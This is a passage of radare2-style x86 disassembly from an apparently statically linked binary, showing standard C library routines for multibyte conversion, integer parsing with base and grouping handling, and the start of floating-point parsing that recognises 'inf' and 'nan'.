je 0x80779e1
cmp eax, 5
je 0x80779e1
cmp eax, 7
mov ebx, 0xfffffffe
je 0x80779fa
call fcn.08048b20
mov ebx, 0xffffffff
mov dword [eax], 0x54
jmp 0x80779fa
cmp eax, 6
je 0x8077a34
cmp eax, 7
je 0x8077a34
cmp eax, 5
je 0x8077a34
mov dword [var_ch], str.__mbrtowc
mov dword [var_8h], 0x57
mov dword [var_4h], str.mbrtowc.c
mov dword [esp], str.status____GCONV_OK__status____GCONV_EMPTY_INPUT__status____GCONV_ILLEGAL_INPUT__status____GCONV_INCOMPLETE_INPUT__status____GCONV_FULL_OUTPUT
jmp 0x8077a23
cmp ebx, 0x809ff60
mov esi, 0x8092dec
je 0x8077982
mov eax, ebx
call fcn.08053a60
mov eax, dword [ebx + 0x14]
jmp 0x8077980
mov eax, dword [0x80a9ab4]
jmp 0x8077973
mov dword [var_4ch], ecx
mov edi, 0x80a4f11
mov dword [arg_10h], 1
jmp 0x807794e
push ebp
mov eax, 0
mov ebp, esp
sub esp, 0x14
test eax, eax
je 0x8085041
mov dword [esp], 3
call section.
mov dword [var_10h], eax
mov eax, dword [arg_14h]
mov dword [var_ch], eax
mov eax, dword [arg_10h]
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08085180
leave
ret
mov eax, dword [0x80a9ab4]
jmp 0x808501b
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x64
mov dword [var_38h], 0
mov dword [var_34h], 0
mov edx, dword [arg_18h]
mov esi, dword [arg_10h]
mov eax, dword [edx + 4]
mov edx, dword [arg_14h]
test edx, edx
jne 0x8085658
mov dword [var_3ch], 0
test esi, esi
js 0x80851c0
cmp esi, 1
je 0x80851c0
cmp esi, 0x24
jle 0x80851d7
call fcn.08048b20
mov dword [eax], 0x16
xor eax, eax
xor edx, edx
add esp, 0x64
pop ebx
pop esi
pop edi
leave
ret
mov edi, dword [arg_8h]
mov ebx, dword [arg_18h]
mov dword [var_28h], edi
mov ebx, dword [ebx + 0x34]
movsx eax, byte [edi]
mov dword [var_50h], ebx
test byte [ebx + eax*2 + 1], 0x20
je 0x808564d
inc edi
mov ecx, dword [var_50h]
movzx edx, byte [edi]
movsx eax, dl
test byte [ecx + eax*2 + 1], 0x20
jne 0x80851f4
test dl, dl
je 0x8085370
cmp dl, 0x2d
mov dword [var_10h], 0
je 0x8085644
cmp dl, 0x2b
je 0x808563b
cmp dl, 0x30
je 0x8085603
test esi, esi
mov eax, 0xa
cmove esi, eax
cmp esi, 0xa
mov eax, 0
mov dword [var_28h], edi
cmove eax, dword [var_3ch]
mov dword [var_2ch], 0
test eax, eax
mov dword [var_3ch], eax
jne 0x808554f
mov edx, dword [esi*8 + 0x80a5f14]
mov eax, dword [esi*8 + 0x80a5f10]
mov dword [var_30h], 0
mov ecx, dword [esi*4 + 0x8092858]
mov dword [var_14h], edx
mov dword [var_18h], eax
movzx edx, byte [esi + 0x80a603e]
mov dword [var_1ch], edx
movzx ebx, byte [edi]
mov dword [var_40h], ecx
mov dword [var_60h], 0
test bl, bl
je 0x80852cf
cmp edi, dword [var_2ch]
je 0x80852cf
lea eax, [ebx - 0x30]
cmp al, 9
ja 0x80854df
mov ebx, eax
movzx edx, bl
cmp edx, esi
jge 0x80852cf
mov eax, dword [var_40h]
cmp dword [var_60h], eax
jae 0x80853ba
mov eax, dword [var_60h]
imul eax, esi
add eax, edx
mov dword [var_60h], eax
inc edi
movzx ebx, byte [edi]
test bl, bl
jne 0x8085297
mov edx, dword [var_60h]
mov dword [var_20h], 0
mov dword [var_24h], edx
cmp edi, dword [var_28h]
je 0x8085370
mov eax, dword [arg_ch]
test eax, eax
je 0x80852f1
mov ebx, dword [arg_ch]
mov dword [ebx], edi
mov eax, dword [var_30h]
test eax, eax
jne 0x808533b
mov edi, dword [var_10h]
test edi, edi
je 0x8085367
cmp dword [var_20h], 0x80000000
ja 0x8085310
jb 0x8085317
cmp dword [var_24h], 0
jbe 0x8085317
mov dword [var_30h], 1
mov esi, dword [var_30h]
test esi, esi
jne 0x808533b
mov ecx, dword [var_10h]
mov eax, dword [var_24h]
mov edx, dword [var_20h]
test ecx, ecx
je 0x80851cf
neg eax
adc edx, 0
neg edx
jmp 0x80851cf
call fcn.08048b20
mov ebx, dword [var_10h]
mov edx, 0x80000000
mov dword [eax], 0x22
xor eax, eax
test ebx, ebx
jne 0x80851cf
mov eax, 0xffffffff
mov edx, 0x7fffffff
jmp 0x80851cf
cmp dword [var_20h], 0x7fffffff
jmp 0x808530e
mov eax, dword [arg_ch]
test eax, eax
je 0x80851cb
mov eax, dword [var_28h]
sub eax, dword [arg_8h]
dec eax
jle 0x8085397
mov eax, dword [var_28h]
mov ecx, dword [arg_18h]
movsx edx, byte [eax - 1]
mov eax, dword [ecx + 0x3c]
cmp dword [eax + edx*4], 0x58
je 0x80853a4
mov ebx, dword [arg_8h]
mov ecx, dword [arg_ch]
mov dword [ecx], ebx
jmp 0x80851cb
mov ebx, dword [var_28h]
cmp byte [ebx - 2], 0x30
jne 0x8085397
mov edx, dword [arg_ch]
mov eax, ebx
dec eax
mov dword [edx], eax
jmp 0x80851cb
mov ecx, dword [var_60h]
mov dword [var_20h], 0
mov dword [var_24h], ecx
mov eax, esi
mov dword [var_58h], esi
sar eax, 0x1f
mov dword [var_54h], eax
mov eax, dword [var_24h]
mul dword [var_58h]
mov dword [var_44h], edx
mov dword [var_48h], eax
mov edx, dword [var_24h]
imul edx, dword [var_54h]
mov eax, dword [var_44h]
mov ecx, dword [var_48h]
add eax, edx
mov edx, dword [var_58h]
imul edx, dword [var_20h]
mov dword [var_20h], 0
add eax, edx
mov dword [var_44h], eax
movzx eax, bl
mov ebx, dword [var_44h]
mov dword [var_24h], eax
add dword [var_24h], ecx
adc dword [var_20h], ebx
nop
inc edi
movzx ebx, byte [edi]
test bl, bl
je 0x80852dc
cmp edi, dword [var_2ch]
je 0x80852dc
lea eax, [ebx - 0x30]
cmp al, 9
ja 0x8085471
mov ebx, eax
movzx ecx, bl
cmp ecx, esi
jge 0x80852dc
mov eax, dword [var_14h]
cmp dword [var_20h], eax
ja 0x8085468
jb 0x808544b
mov edx, dword [var_18h]
cmp dword [var_24h], edx
ja 0x8085468
mov edx, dword [var_20h]
mov eax, dword [var_24h]
xor edx, dword [var_14h]
xor eax, dword [var_18h]
or edx, eax
jne 0x80853c7
cmp ecx, dword [var_1ch]
jbe 0x80853c7
mov dword [var_30h], 1
jmp 0x8085410
mov eax, dword [var_38h]
test eax, eax
je 0x80854c6
xor edx, edx
cmp edx, dword [var_38h]
jae 0x8085492
nop
mov ecx, dword [var_34h]
movzx eax, byte [edx + edi]
cmp byte [edx + ecx], al
jne 0x8085492
inc edx
cmp edx, dword [var_38h]
jb 0x8085480
cmp edx, dword [var_38h]
je 0x80854ba
mov ecx, dword [arg_18h]
movzx edx, bl
mov eax, dword [ecx + 0x34]
test byte [eax + edx*2 + 1], 4
je 0x80852dc
mov eax, dword [ecx + 0x3c]
movzx ebx, byte [eax + edx*4]
sub ebx, 0x37
jmp 0x808542e
mov ebx, dword [var_38h]
lea edi, [ebx + edi - 1]
jmp 0x8085410
movzx edx, bl
mov ebx, dword [arg_18h]
mov eax, dword [ebx + 0x34]
test byte [eax + edx*2 + 1], 4
je 0x80852dc
mov eax, dword [ebx + 0x3c]
jmp 0x80854ae
mov eax, dword [var_38h]
test eax, eax
je 0x8085536
xor edx, edx
cmp edx, dword [var_38h]
jae 0x8085502
lea esi, [esi]
mov ecx, dword [var_34h]
movzx eax, byte [edx + edi]
cmp byte [edx + ecx], al
jne 0x8085502
inc edx
cmp edx, dword [var_38h]
jb 0x80854f0
cmp edx, dword [var_38h]
je 0x808552a
mov ecx, dword [arg_18h]
movzx edx, bl
mov eax, dword [ecx + 0x34]
test byte [eax + edx*2 + 1], 4
je 0x80852cf
mov eax, dword [ecx + 0x3c]
movzx ebx, byte [eax + edx*4]
sub ebx, 0x37
jmp 0x80852a9
mov ebx, dword [var_38h]
lea edi, [ebx + edi - 1]
jmp 0x80852c7
movzx edx, bl
mov ebx, dword [arg_18h]
mov eax, dword [ebx + 0x34]
test byte [eax + edx*2 + 1], 4
je 0x80852cf
mov eax, dword [ebx + 0x3c]
jmp 0x808551e
mov ebx, dword [var_34h]
mov dword [esp], ebx
call fcn.08053400
xor edx, edx
mov dword [var_2ch], edi
mov dword [var_38h], eax
mov dword [var_60h], eax
cmp edx, dword [var_38h]
jae 0x808557c
mov ecx, dword [var_34h]
movzx eax, byte [edx + edi]
cmp byte [edx + ecx], al
jne 0x808557c
inc edx
cmp edx, dword [var_60h]
jb 0x808556a
cmp edx, dword [var_60h]
jae 0x808525a
movzx ebx, byte [edi]
test bl, bl
je 0x80855de
lea eax, [ebx - 0x30]
cmp al, 9
jbe 0x80855d1
xor edx, edx
cmp edx, dword [var_60h]
jae 0x80855af
mov eax, dword [var_2ch]
mov ecx, dword [var_34h]
movzx eax, byte [edx + eax]
cmp byte [edx + ecx], al
jne 0x80855af
inc edx
cmp edx, dword [var_60h]
jb 0x808559a
cmp edx, dword [var_60h]
jae 0x80855d1
movzx edx, bl
mov ebx, dword [var_50h]
test byte [ebx + edx*2 + 1], 4
je 0x80855de
mov ecx, dword [arg_18h]
mov eax, dword [ecx + 0x3c]
mov eax, dword [eax + edx*4]
sub eax, 0x37
cmp eax, esi
jge 0x80855de
inc dword [var_2ch]
mov eax, dword [var_2ch]
movzx ebx, byte [eax]
test bl, bl
jne 0x808558c
mov edx, dword [var_3ch]
mov ecx, dword [var_34h]
mov dword [esp], edi
mov ebx, dword [var_2ch]
mov dword [var_ch], edx
mov dword [var_8h], ecx
mov dword [var_4h], ebx
call fcn.08049980
mov dword [var_2ch], eax
jmp 0x808525a
test esi, esi
je 0x808561e
cmp esi, 0x10
je 0x808561e
test esi, esi
jne 0x8085239
mov esi, 8
jmp 0x8085239
mov ecx, dword [arg_18h]
movsx edx, byte [edi + 1]
mov eax, dword [ecx + 0x3c]
cmp dword [eax + edx*4], 0x58
jne 0x808560c
add edi, 2
mov esi, 0x10
jmp 0x8085239
inc edi
movzx edx, byte [edi]
jmp 0x8085226
mov dword [var_10h], 1
jmp 0x808563b
mov ebx, dword [arg_8h]
movzx edx, byte [ebx]
jmp 0x8085205
mov ecx, dword [eax + 0x2c]
mov dword [var_3ch], ecx
movzx edx, byte [ecx]
test dl, dl
jle 0x80851ab
cmp dl, 0x7f
je 0x80851ab
mov eax, dword [eax + 0x28]
mov dword [var_34h], eax
cmp byte [eax], 0
jne 0x80851b2
mov dword [var_34h], 0
jmp 0x80851ab
push ebp
mov eax, 0
mov ebp, esp
sub esp, 0x14
test eax, eax
je 0x8085101
mov dword [esp], 3
call section.
mov dword [var_10h], eax
mov eax, dword [arg_14h]
mov dword [var_ch], eax
mov eax, dword [arg_10h]
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.080856c0
leave
ret
mov eax, dword [0x80a9ab4]
jmp 0x80850db
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x64
mov dword [var_38h], 0
mov dword [var_34h], 0
mov edx, dword [arg_18h]
mov esi, dword [arg_10h]
mov eax, dword [edx + 4]
mov edx, dword [arg_14h]
test edx, edx
jne 0x8085b58
mov dword [var_3ch], 0
test esi, esi
js 0x8085700
cmp esi, 1
je 0x8085700
cmp esi, 0x24
jle 0x8085717
call fcn.08048b20
mov dword [eax], 0x16
xor eax, eax
xor edx, edx
add esp, 0x64
pop ebx
pop esi
pop edi
leave
ret
mov edi, dword [arg_8h]
mov ebx, dword [arg_18h]
mov dword [var_28h], edi
mov ebx, dword [ebx + 0x34]
movsx eax, byte [edi]
mov dword [var_50h], ebx
test byte [ebx + eax*2 + 1], 0x20
je 0x8085b4d
inc edi
mov ecx, dword [var_50h]
movzx edx, byte [edi]
movsx eax, dl
test byte [ecx + eax*2 + 1], 0x20
jne 0x8085734
test dl, dl
je 0x808586b
cmp dl, 0x2d
mov dword [var_10h], 0
je 0x8085b44
cmp dl, 0x2b
je 0x8085b3b
cmp dl, 0x30
je 0x8085b03
test esi, esi
mov eax, 0xa
cmove esi, eax
cmp esi, 0xa
mov eax, 0
mov dword [var_28h], edi
cmove eax, dword [var_3ch]
mov dword [var_2ch], 0
test eax, eax
mov dword [var_3ch], eax
jne 0x8085a4f
mov edx, dword [esi*8 + 0x80a5f14]
mov eax, dword [esi*8 + 0x80a5f10]
mov dword [var_30h], 0
mov ecx, dword [esi*4 + 0x8092858]
mov dword [var_14h], edx
mov dword [var_18h], eax
movzx edx, byte [esi + 0x80a603e]
mov dword [var_1ch], edx
movzx ebx, byte [edi]
mov dword [var_40h], ecx
mov dword [var_60h], 0
test bl, bl
je 0x808580f
cmp edi, dword [var_2ch]
je 0x808580f
lea eax, [ebx - 0x30]
cmp al, 9
ja 0x80859df
mov ebx, eax
movzx edx, bl
cmp edx, esi
jge 0x808580f
mov eax, dword [var_40h]
cmp dword [var_60h], eax
jae 0x80858b5
mov eax, dword [var_60h]
imul eax, esi
add eax, edx
mov dword [var_60h], eax
inc edi
movzx ebx, byte [edi]
test bl, bl
jne 0x80857d7
mov edx, dword [var_60h]
mov dword [var_20h], 0
mov dword [var_24h], edx
cmp edi, dword [var_28h]
je 0x808586b
mov esi, dword [arg_ch]
test esi, esi
je 0x808582d
mov ebx, dword [arg_ch]
mov dword [ebx], edi
mov ebx, dword [var_30h]
test ebx, ebx
jne 0x8085851
mov ecx, dword [var_10h]
mov eax, dword [var_24h]
mov edx, dword [var_20h]
test ecx, ecx
je 0x808570f
neg eax
adc edx, 0
neg edx
jmp 0x808570f
call fcn.08048b20
mov edx, 0xffffffff
mov dword [eax], 0x22
mov eax, 0xffffffff
jmp 0x808570f
mov eax, dword [arg_ch]
test eax, eax
je 0x808570b
mov eax, dword [var_28h]
sub eax, dword [arg_8h]
dec eax
jle 0x8085892
mov eax, dword [var_28h]
mov ecx, dword [arg_18h]
movsx edx, byte [eax - 1]
mov eax, dword [ecx + 0x3c]
cmp dword [eax + edx*4], 0x58
je 0x808589f
mov ebx, dword [arg_8h]
mov ecx, dword [arg_ch]
mov dword [ecx], ebx
jmp 0x808570b
mov ebx, dword [var_28h]
cmp byte [ebx - 2], 0x30
jne 0x8085892
mov edx, dword [arg_ch]
mov eax, ebx
dec eax
mov dword [edx], eax
jmp 0x808570b
mov ecx, dword [var_60h]
mov dword [var_20h], 0
mov dword [var_24h], ecx
mov eax, esi
mov dword [var_58h], esi
sar eax, 0x1f
mov dword [var_54h], eax
mov eax, dword [var_24h]
mul dword [var_58h]
mov dword [var_44h], edx
mov dword [var_48h], eax
mov edx, dword [var_24h]
imul edx, dword [var_54h]
mov eax, dword [var_44h]
mov ecx, dword [var_48h]
add eax, edx
mov edx, dword [var_58h]
imul edx, dword [var_20h]
mov dword [var_20h], 0
add eax, edx
mov dword [var_44h], eax
movzx eax, bl
mov ebx, dword [var_44h]
mov dword [var_24h], eax
add dword [var_24h], ecx
adc dword [var_20h], ebx
lea esi, [esi]
inc edi
movzx ebx, byte [edi]
test bl, bl
je 0x808581c
cmp edi, dword [var_2ch]
je 0x808581c
lea eax, [ebx - 0x30]
cmp al, 9
ja 0x8085971
mov ebx, eax
movzx ecx, bl
cmp ecx, esi
jge 0x808581c
mov eax, dword [var_14h]
cmp dword [var_20h], eax
ja 0x8085968
jb 0x808594b
mov edx, dword [var_18h]
cmp dword [var_24h], edx
ja 0x8085968
mov edx, dword [var_20h]
mov eax, dword [var_24h]
xor edx, dword [var_14h]
xor eax, dword [var_18h]
or edx, eax
jne 0x80858c2
cmp ecx, dword [var_1ch]
jbe 0x80858c2
mov dword [var_30h], 1
jmp 0x8085910
mov eax, dword [var_38h]
test eax, eax
je 0x80859c6
xor edx, edx
cmp edx, dword [var_38h]
jae 0x8085992
nop
mov ecx, dword [var_34h]
movzx eax, byte [edx + edi]
cmp byte [edx + ecx], al
jne 0x8085992
inc edx
cmp edx, dword [var_38h]
jb 0x8085980
cmp edx, dword [var_38h]
je 0x80859ba
mov ecx, dword [arg_18h]
movzx edx, bl
mov eax, dword [ecx + 0x34]
test byte [eax + edx*2 + 1], 4
je 0x808581c
mov eax, dword [ecx + 0x3c]
movzx ebx, byte [eax + edx*4]
sub ebx, 0x37
jmp 0x808592e
mov ebx, dword [var_38h]
lea edi, [ebx + edi - 1]
jmp 0x8085910
movzx edx, bl
mov ebx, dword [arg_18h]
mov eax, dword [ebx + 0x34]
test byte [eax + edx*2 + 1], 4
je 0x808581c
mov eax, dword [ebx + 0x3c]
jmp 0x80859ae
mov eax, dword [var_38h]
test eax, eax
je 0x8085a36
xor edx, edx
cmp edx, dword [var_38h]
jae 0x8085a02
lea esi, [esi]
mov ecx, dword [var_34h]
movzx eax, byte [edx + edi]
cmp byte [edx + ecx], al
jne 0x8085a02
inc edx
cmp edx, dword [var_38h]
jb 0x80859f0
cmp edx, dword [var_38h]
je 0x8085a2a
mov ecx, dword [arg_18h]
movzx edx, bl
mov eax, dword [ecx + 0x34]
test byte [eax + edx*2 + 1], 4
je 0x808580f
mov eax, dword [ecx + 0x3c]
movzx ebx, byte [eax + edx*4]
sub ebx, 0x37
jmp 0x80857e9
mov ebx, dword [var_38h]
lea edi, [ebx + edi - 1]
jmp 0x8085807
movzx edx, bl
mov ebx, dword [arg_18h]
mov eax, dword [ebx + 0x34]
test byte [eax + edx*2 + 1], 4
je 0x808580f
mov eax, dword [ebx + 0x3c]
jmp 0x8085a1e
mov ebx, dword [var_34h]
mov dword [esp], ebx
call fcn.08053400
xor edx, edx
mov dword [var_2ch], edi
mov dword [var_38h], eax
mov dword [var_60h], eax
cmp edx, dword [var_38h]
jae 0x8085a7c
mov ecx, dword [var_34h]
movzx eax, byte [edx + edi]
cmp byte [edx + ecx], al
jne 0x8085a7c
inc edx
cmp edx, dword [var_60h]
jb 0x8085a6a
cmp edx, dword [var_60h]
jae 0x808579a
movzx ebx, byte [edi]
test bl, bl
je 0x8085ade
lea eax, [ebx - 0x30]
cmp al, 9
jbe 0x8085ad1
xor edx, edx
cmp edx, dword [var_60h]
jae 0x8085aaf
mov eax, dword [var_2ch]
mov ecx, dword [var_34h]
movzx eax, byte [edx + eax]
cmp byte [edx + ecx], al
jne 0x8085aaf
inc edx
cmp edx, dword [var_60h]
jb 0x8085a9a
cmp edx, dword [var_60h]
jae 0x8085ad1
movzx edx, bl
mov ebx, dword [var_50h]
test byte [ebx + edx*2 + 1], 4
je 0x8085ade
mov ecx, dword [arg_18h]
mov eax, dword [ecx + 0x3c]
mov eax, dword [eax + edx*4]
sub eax, 0x37
cmp eax, esi
jge 0x8085ade
inc dword [var_2ch]
mov eax, dword [var_2ch]
movzx ebx, byte [eax]
test bl, bl
jne 0x8085a8c
mov edx, dword [var_3ch]
mov ecx, dword [var_34h]
mov dword [esp], edi
mov ebx, dword [var_2ch]
mov dword [var_ch], edx
mov dword [var_8h], ecx
mov dword [var_4h], ebx
call fcn.08049980
mov dword [var_2ch], eax
jmp 0x808579a
test esi, esi
je 0x8085b1e
cmp esi, 0x10
je 0x8085b1e
test esi, esi
jne 0x8085779
mov esi, 8
jmp 0x8085779
mov ecx, dword [arg_18h]
movsx edx, byte [edi + 1]
mov eax, dword [ecx + 0x3c]
cmp dword [eax + edx*4], 0x58
jne 0x8085b0c
add edi, 2
mov esi, 0x10
jmp 0x8085779
inc edi
movzx edx, byte [edi]
jmp 0x8085766
mov dword [var_10h], 1
jmp 0x8085b3b
mov ebx, dword [arg_8h]
movzx edx, byte [ebx]
jmp 0x8085745
mov ecx, dword [eax + 0x2c]
mov dword [var_3ch], ecx
movzx edx, byte [ecx]
test dl, dl
jle 0x80856eb
cmp dl, 0x7f
je 0x80856eb
mov eax, dword [eax + 0x28]
mov dword [var_34h], eax
cmp byte [eax], 0
jne 0x80856f2
mov dword [var_34h], 0
jmp 0x80856eb
push ebp
mov eax, 0
mov ebp, esp
sub esp, 0x10
test eax, eax
je 0x8085cc0
mov dword [esp], 3
call section.
mov dword [var_ch], eax
mov eax, dword [arg_10h]
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08088130
leave
ret
lea esi, [esi]
mov eax, dword [0x80a9ab4]
jmp 0x8085c9b
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x22c
mov ecx, dword [arg_10h]
mov eax, dword [arg_14h]
mov dword [var_168h], 0xa
mov dword [var_190h], 0
test ecx, ecx
mov edx, dword [eax + 4]
je 0x8088189
mov ecx, dword [edx + 0x2c]
mov dword [var_194h], ecx
movzx eax, byte [ecx]
test al, al
jle 0x8088189
cmp al, 0x7f
je 0x8088189
mov esi, dword [edx + 0x28]
mov dword [var_190h], esi
cmp byte [esi], 0
jne 0x8088193
mov dword [var_190h], 0
mov dword [var_194h], 0
mov edx, dword [edx + 0x24]
mov dword [var_18ch], edx
mov dword [esp], edx
call fcn.08053400
mov edi, dword [arg_8h]
mov dword [var_170h], 0
mov dword [var_198h], eax
mov dword [var_15ch], 0
mov dword [var_164h], 0
mov eax, dword [arg_14h]
dec edi
mov edx, dword [eax + 0x34]
inc edi
movzx esi, byte [edi]
mov ecx, esi
movsx eax, cl
test byte [edx + eax*2 + 1], 0x20
jne 0x80881d2
cmp cl, 0x2d
je 0x8089f3c
cmp cl, 0x2b
je 0x8089f33
mov edx, dword [var_18ch]
xor ebx, ebx
movzx edx, byte [edx]
test dl, dl
mov byte [var_206h], dl
mov byte [var_205h], dl
je 0x8089f28
mov eax, edx
cmp byte [ebx + edi], al
jne 0x8089f1b
mov ecx, dword [var_18ch]
inc ebx
movzx eax, byte [ebx + ecx]
test al, al
jne 0x8088215
movzx eax, byte [ebx + edi]
cmp al, 0x2f
jle 0x808823d
cmp al, 0x39
jle 0x808840a
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x808840a
mov ecx, esi
mov esi, dword [arg_14h]
movsx eax, cl
mov ebx, eax
mov ecx, dword [esi + 0x38]
cmp dword [ecx + eax*4], 0x69
je 0x808838c
cmp dword [ecx + ebx*4], 0x6e
jne 0x8088376
mov ecx, dword [arg_14h]
mov dword [var_8h], 3
mov dword [var_4h], 0x80a0fb8
mov dword [esp], edi
mov dword [var_ch], ecx
call fcn.0808dd40
test eax, eax
jne 0x8088376
fld dword [0x80a61a4]
add edi, 3
fstp qword [ebp - 0x1a0]
cmp byte [edi], 0x28
je 0x80882c1
mov eax, dword [arg_ch]
test eax, eax
je 0x80882b0
mov eax, dword [arg_ch]
mov dword [eax], edi
fld qword [ebp - 0x1a0]
add esp, 0x22c
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [arg_14h]
mov ebx, edi
mov ecx, dword [eax + 0x38]
inc edi
movzx edx, byte [edi]
lea eax, [edx - 0x30]
cmp al, 9
jbe 0x80882c9
movsx eax, dl
mov eax, dword [ecx + eax*4]
cmp eax, 0x60
jle 0x80882e4
cmp eax, 0x7a
jle 0x80882c9
cmp dl, 0x5f
je 0x80882c9
cmp dl, 0x29
je 0x80882f2
mov edi, ebx
jmp 0x80882a4
mov edx, dword [arg_14h]
lea eax, [var_150h]
mov dword [var_ch], 0
mov dword [var_4h], eax
mov dword [var_8h], 0
lea eax, [ebx + 1]
mov dword [esp], eax
mov dword [var_10h], edx
call fcn.080856c0
cmp dword [var_150h], edi
mov ecx, eax
mov ebx, edx
jne 0x80882a4
fld qword [ebp - 0x1a0]
and edx, 0xfffff
mov esi, edx
or esi, eax
fstp qword [ebp - 0x1a8]
jne 0x808834d
xor ecx, ecx
mov ebx, 0x80000
mov eax, ebx
mov dword [var_1a8h], ecx
and eax, 0xfffff
or eax, 0x7ff00000
mov dword [var_1a4h], eax
fld qword [ebp - 0x1a8]
fstp qword [ebp - 0x1a0]
jmp 0x80882a4
mov eax, dword [arg_ch]
test eax, eax
je 0x8088385
mov ecx, dword [arg_8h]
mov edx, dword [arg_ch]
mov dword [edx], ecx
fldz
jmp 0x80882b6
mov dword [var_ch], esi
mov dword [var_8h], 3
mov dword [var_4h], 0x80a0fc0
mov dword [esp], edi
call fcn.0808dd40
test eax, eax
jne 0x80883ff
mov eax, dword [arg_ch]
test eax, eax
je 0x80883df
lea ebx, [edi + 3]
mov dword [var_ch], esi
mov dword [var_8h], 5
mov dword [esp], ebx
mov dword [var_4h], str.inity
call fcn.0808dd40
test eax, eax
lea edx, [edi + 8]
mov eax, dword [arg_ch]
cmove ebx, edx
mov dword [eax], ebx
mov edx, dword [var_164h]
test edx, edx
je 0x80883f4
fld dword [0x80a6100]
jmp 0x80882b6
fld dword [0x80a61a0]
jmp 0x80882b6
mov edx, dword [arg_14h]
mov ecx, dword [edx + 0x38]
jmp 0x808825f
mov eax, esi
cmp al, 0x30
je 0x8089ee8
mov eax, dword [var_190h]
mov dword [var_178h], edi
test eax, eax
je 0x8089ece
mov ecx, dword [var_190h]
movzx edx, byte [ecx]
mov eax, esi
cmp al, 0x30
je 0x8088465
xor ebx, ebx
test dl, dl
je 0x8089ec0
mov ecx, dword [var_190h]
movzx eax, byte [ecx]
lea esi, [esi]
mov ecx, esi
cmp cl, al
jne 0x808846b
mov ecx, dword [var_190h]
inc ebx
movzx eax, byte [ebx + ecx]
test al, al
jne 0x8088450
inc edi
movzx esi, byte [edi]
jmp 0x8088431
test al, al
je 0x8088465
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x8088483
cmp dword [var_168h], 0x10
je 0x8089e6b
mov dword [var_174h], edi
mov dword [var_180h], 0
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x8089e60
cmp dword [var_168h], 0x10
je 0x8089e3e
mov eax, dword [var_190h]
test eax, eax
je 0x80884ea
mov ecx, dword [var_190h]
xor ebx, ebx
movzx eax, byte [ecx]
test al, al
je 0x8089e30
cmp al, byte [ebx + edi]
jne 0x80884e6
mov edx, dword [var_190h]
inc ebx
movzx eax, byte [ebx + edx]
test al, al
jne 0x80884c8
lea esi, [esi]
inc edi
movzx esi, byte [edi]
jmp 0x8088493
test al, al
je 0x80884e0
mov eax, dword [var_194h]
test eax, eax
je 0x8089aa5
mov ebx, dword [var_180h]
test ebx, ebx
jle 0x8089aa5
mov ecx, dword [var_178h]
mov eax, dword [var_194h]
mov dword [var_4h], edi
mov edx, dword [var_190h]
mov dword [esp], ecx
mov dword [var_ch], eax
mov dword [var_8h], edx
call fcn.08049980
cmp edi, eax
mov ecx, eax
je 0x8089a96
cmp eax, dword [var_178h]
je 0x8089a7e
cmp eax, dword [var_174h]
jb 0x8089a6e
mov ecx, dword [var_174h]
mov edi, eax
mov dword [var_180h], 0
cmp ecx, eax
jae 0x8088585
movzx eax, byte [ecx]
mov edx, dword [var_180h]
inc edx
sub eax, 0x30
cmp al, 9
cmova edx, dword [var_180h]
inc ecx
cmp ecx, edi
mov dword [var_180h], edx
jb 0x8088564
mov ecx, dword [var_180h]
mov dword [var_188h], 0
mov dword [var_184h], ecx
mov edx, dword [arg_ch]
test edx, edx
je 0x80885a7
mov edx, dword [arg_ch]
mov dword [edx], edi
mov eax, dword [var_180h]
test eax, eax
jne 0x80885ca
mov eax, dword [var_164h]
test eax, eax
je 0x8088385
fld dword [0x80a6104]
jmp 0x80882b6
mov eax, dword [var_188h]
test eax, eax
je 0x808867c
mov ecx, dword [var_18ch]
mov esi, dword [var_18ch]
movzx ecx, byte [ecx]
mov byte [var_206h], cl
movzx edx, byte [esi + 1]
mov ecx, dword [var_174h]
movzx eax, byte [var_206h]
cmp byte [ecx], al
je 0x808860a
inc dword [var_174h]
jmp 0x80885f1
test dl, dl
mov ebx, 1
je 0x8089a62
mov esi, dword [var_18ch]
movzx eax, byte [esi + 1]
mov ecx, dword [var_174h]
cmp al, byte [ebx + ecx]
jne 0x8089a55
mov esi, dword [var_18ch]
inc ebx
movzx eax, byte [ebx + esi]
test al, al
jne 0x8088621
mov eax, dword [var_188h]
add eax, dword [var_198h]
add dword [var_174h], eax
cmp dword [var_168h], 0x10
je 0x8089a3f
mov edx, dword [var_15ch]
sub edx, dword [var_188h]
mov esi, dword [var_188h]
mov dword [var_15ch], edx
sub dword [var_180h], esi
cmp dword [var_168h], 0x10
je 0x8089827
mov ebx, dword [var_15ch]
test ebx, ebx
mov edx, ebx
js 0x808980e
mov eax, dword [var_180h]
sub eax, dword [var_184h]
cmp ebx, eax
cmovle eax, ebx
add dword [var_184h], eax
mov ebx, edx
sub ebx, eax
mov eax, dword [var_184h]
mov dword [var_15ch], ebx
add eax, ebx
cmp eax, 0x135
jg 0x8088854
cmp ebx, 0xfffffebd
jl 0x80897fe
mov ecx, dword [var_184h]
test ecx, ecx
jle 0x8088a15
mov esi, dword [var_18ch]
mov edx, dword [var_190h]
lea eax, [var_15ch]
mov ecx, dword [var_198h]
mov dword [var_10h], eax
mov eax, dword [var_174h]
mov dword [var_14h], esi
mov dword [var_1ch], edx
mov esi, dword [var_184h]
mov dword [var_18h], ecx
lea edx, [var_160h]
mov dword [esp], eax
lea ecx, [var_ach]
mov dword [var_ch], edx
mov dword [var_8h], ecx
mov dword [var_4h], esi
call fcn.08087f00
mov ebx, dword [var_15ch]
mov dword [var_174h], eax
test ebx, ebx
jle 0x8088829
lea edx, [var_ach]
lea ecx, [var_14ch]
mov edi, 1
mov dword [var_1b4h], edx
mov dword [var_1b8h], ecx
mov dword [var_1bch], 0x80a7020
test edi, ebx
je 0x8088806
mov eax, dword [var_1bch]
mov edx, dword [var_160h]
xor ebx, edi
mov dword [var_15ch], ebx
mov esi, dword [eax + 4]
sub esi, 2
